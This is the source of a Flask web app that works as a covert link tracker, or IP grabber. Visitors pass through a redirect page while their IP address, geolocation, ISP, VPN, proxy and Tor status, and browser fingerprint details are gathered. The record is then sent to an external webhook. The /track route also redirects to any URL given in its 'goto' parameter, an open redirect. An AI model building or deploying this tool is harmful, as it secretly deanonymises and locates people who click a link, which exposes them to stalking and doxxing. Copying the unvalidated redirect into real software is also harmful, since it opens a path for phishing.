from flask import Flask, request, render_template
from datetime import datetime, timezone
import requests
import json
import logging
import os

app = Flask(__name__)

# =========================
# Configuration
# =========================
TRACK_URL = os.getenv("TRACK_URL")
MAKE_WEBHOOK = os.getenv("MAKE_WEBHOOK")
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN")

# =========================
# Logging
# =========================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

logger = logging.getLogger(__name__)

# Reuse HTTP connections
http = requests.Session()


# =========================
# Helpers
# =========================
def get_client_ip():
    """Get the client IP from common proxy headers."""
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip:
        return cf_ip.strip()

    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        return forwarded.split(",")[0].strip()

    return request.remote_addr or "N/A"


def get_ip_info(ip):
    """Get approximate IP information from ipinfo."""
    if not IPINFO_TOKEN or ip == "N/A":
        return {}

    try:
        response = http.get(
            f"https://ipinfo.io/{ip}",
            params={"token": IPINFO_TOKEN},
            timeout=5
        )
        response.raise_for_status()
        return response.json()

    except requests.RequestException as e:
        logger.warning("IPInfo request failed: %s", e)
        return {}

    except ValueError:
        logger.warning("IPInfo returned invalid JSON")
        return {}


def send_to_webhook(data):
    """Send collected data to the configured webhook."""
    if not MAKE_WEBHOOK:
        logger.warning("MAKE_WEBHOOK is not configured")
        return

    try:
        response = http.post(
            MAKE_WEBHOOK,
            json=data,
            timeout=5
        )

        response.raise_for_status()
        logger.info("Webhook request successful")

    except requests.RequestException as e:
        logger.warning("Webhook request failed: %s", e)


# =========================
# Routes
# =========================
@app.route("/")
def home():
    if not TRACK_URL:
        return "TRACK_URL is not configured", 500

    return redirect_to_track()


def redirect_to_track():
    from urllib.parse import urlencode

    url = "/track?" + urlencode({"goto": TRACK_URL})
    from flask import redirect

    return redirect(url)


@app.route("/track")
def track():
    goto = request.args.get("goto") or TRACK_URL

    if not goto:
        return "TRACK_URL is not configured", 500

    return render_template(
        "redirect.html",
        goto=goto
    )


@app.route("/collect", methods=["POST"])
def collect():
    # Safely read JSON
    js_data = request.get_json(silent=True) or {}

    # =========================
    # Request information
    # =========================
    ip = get_client_ip()

    user_agent = request.headers.get(
        "User-Agent",
        ""
    )

    language = request.headers.get(
        "Accept-Language",
        ""
    )

    # =========================
    # IP information
    # =========================
    geo = get_ip_info(ip)

    privacy = geo.get("privacy") or {}

    country = geo.get("country", "N/A")
    city = geo.get("city", "N/A")
    region = geo.get("region", "N/A")
    org = geo.get("org", "N/A")

    is_vpn = privacy.get("vpn", False)
    is_proxy = privacy.get("proxy", False)
    is_tor = privacy.get("tor", False)

    # =========================
    # Browser information
    # =========================
    platform = js_data.get("platform", "")
    timezone_name = js_data.get("timezone", "")
    local_time = js_data.get("localTime", "")
    screen = js_data.get("screen", "")

    # =========================
    # Final data
    # =========================
    data = {
        "ip": ip,
        "userAgent": user_agent,
        "language": language,
        "platform": platform,
        "timezone": timezone_name,
        "localTime": local_time,
        "screen": screen,
        "location": {
            "country": country,
            "city": city,
            "region": region,
            "org": org,
            "isVPN": is_vpn,
            "isProxy": is_proxy,
            "isTor": is_tor
        },
        "timestamp": datetime.now(timezone.utc).isoformat()
    }

    # =========================
    # Send to webhook
    # =========================
    send_to_webhook(data)

    # =========================
    # Server log
    # =========================
    logger.info(
        "Visitor data: %s",
        json.dumps(data, ensure_ascii=False)
    )

    return "", 204


# =========================
# Startup
# =========================
if __name__ == "__main__":
    port = int(os.getenv("PORT", "10000"))

    logger.info("Starting server on port %s", port)

    if not TRACK_URL:
        logger.warning("TRACK_URL is not configured")

    if not MAKE_WEBHOOK:
        logger.warning("MAKE_WEBHOOK is not configured")

    if not IPINFO_TOKEN:
        logger.warning("IPINFO_TOKEN is not configured")

    app.run(
        host="0.0.0.0",
        port=port
    )
